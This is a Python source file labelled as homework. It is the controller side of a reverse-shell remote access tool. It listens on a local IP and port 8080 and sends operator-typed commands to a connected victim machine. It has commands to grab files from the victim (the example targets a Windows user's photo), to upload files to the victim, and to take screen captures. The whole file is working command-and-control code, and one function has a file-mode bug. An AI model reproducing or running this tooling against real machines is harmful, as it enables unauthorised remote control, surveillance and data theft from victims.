#Server For Homework

import socket
import os
import time

def letGrab(conn, userinput, operation):
    try:
        conn.send(userinput.encode())
        if operation == "grab":
            parts = userinput.split("*")
            if len(parts) < 2:
                print("[+] Invalid grab command format")
                return
            grab, sourcePathFileName = parts
            path = "/home/akawilk/Desktop/GrabbedFile/"
            os.makedirs(path, exist_ok=True)
            fileName = "grabbed_" + os.path.basename(sourcePathFileName)
            file_path = os.path.join(path, fileName)

            with open(file_path, 'ab') as f:
                while True:
                    bits = conn.recv(1024)
                    if not bits:
                        break
                    if bits.endswith(b"DONE"):
                        f.write(bits[:-4])
                        print("[+] Transfer completed")
                        break
                    if b"File not found" in bits:
                        print("[-] Unable to find the file")
                        return
                    f.write(bits)

        print(f"File Saved as: {fileName}")
        print(f"Location: {path}")

    except Exception as e:

        conn.send(f"[-] Error in file transfer: {e}".encode())

def doSend(conn, sourcePath, destinationPath, fileName):
    try:
        full_path = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for file: {full_path}")

        if not os.path.isfile(full_path):
            conn.send(b"File not found")
            print(f"File does not exist: {full_path}")
            return

        if os.path.getsize(full_path) == 0:
            conn.send(b"File is empty")
            print(f"[-] file is empty: {full_path}")
            return

        with open(full_path, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                conn.send(packet)
            conn.send(b'DONE')
            print("[+] Transfer Completed")
    except Exception as e:
        conn.send(b"File transfer error")
        print(f"[-] Error during file send: {str(e)}")

def transfer(conn, userinput, operation):
    conn.send(userinput.encode())

    if operation == "grab":
        grab, path = userinput.split("*")
        f = open('/home/akawilk/Desktop/' + path, )

    elif operation == "screenCap":
        fileName = f"screenCapture_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
        f = open('/home/akawilk/Desktop/' + fileName, 'wb')

    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if b'File not found' in bits:
            print('[-] Unable to find the file')
            break
        f.write(bits)

    print("File written to: /root/Desktop")

def conn():
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.bind(("192.168.182.128", 8080))
    print("[+] Waiting for incoming TCP connection on port 8080")
    mysocket.listen(1)
    print("[+] Listening for connections...")

    conn, address = mysocket.accept()
    print(f"[+] Connection established with {address}")

    while True:
        try:
            userinput = input("Shell > ")
            if userinput.lower() == "term":
                conn.send(b"term")
                conn.close()
                print("[+] Connection closed by user.")
                break

                # command format: grab*<filepath>
                # Example: grab*C:\Users\John\Desktop\photo.jpg
            elif userinput.startswith("grab"):
                letGrab(conn, userinput, "grab")

            elif 'send' in userinput:
                # command format: send*<destination path>*<File Name>
                # example: send*C:\Users\John\Desktop\*photo.jpeg
                # source file in Linux. Example: /home/akawilk/Desktop
                sendCmd, destination, fileName = userinput.split("*")
                source = input("Source path: ")
                conn.send(userinput.encode())
                doSend(conn, source, destination, fileName)

            elif userinput == "screenCap":
                transfer(conn, userinput, "screenCap")

            else:
                conn.send(userinput.encode())
                response = conn.recv(1024).decode(errors='ignore')
                print(response)

        except Exception as e:
            print(f"[-] Connection Error: {e}")
            break

def main():
    conn()

if __name__ == "__main__":
    main()
